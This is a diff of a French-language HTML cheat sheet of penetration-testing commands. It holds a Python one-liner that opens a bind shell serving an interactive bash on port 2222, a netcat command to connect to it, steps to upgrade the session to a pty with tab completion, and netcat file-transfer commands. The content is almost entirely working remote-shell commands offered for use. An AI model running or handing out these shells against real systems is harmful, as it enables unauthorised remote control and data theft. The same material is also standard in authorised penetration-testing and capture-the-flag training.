@@ -10,13 +10,17 @@ Ouvrent un shell sur le port 2222 :
   <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</li>
 </ul>
 On se connecte avec nc -nv 2222 adress port</br>
-Pour avoir un shell tty :</br>
-python -c "import pty; pty.spawn('/bin/bash')"</br>
-Pour avoir tab completion tout joli :</br>
-CTRL-Z</br>
-stty echo -raw</br>
-fg</br>
-
+<h4>Pour avoir un shell pty :</h4>
+<ul>
+  <li>python -c "import pty; pty.spawn('/bin/bash')"</li>
+</ul>
+<h4>Pour avoir tab completion tout joli :</h4>
+<ul>
+  <li>Prendre un shell pty avec la commande plus haut</li>
+  <li>CTRL-Z</li>
+  <li>stty raw -echo</li>
+  <li>fg</li>
+</ul>
 
 Envoi fichier avec netcat :</br>
 nc -l -p 1234 > out.file</br>
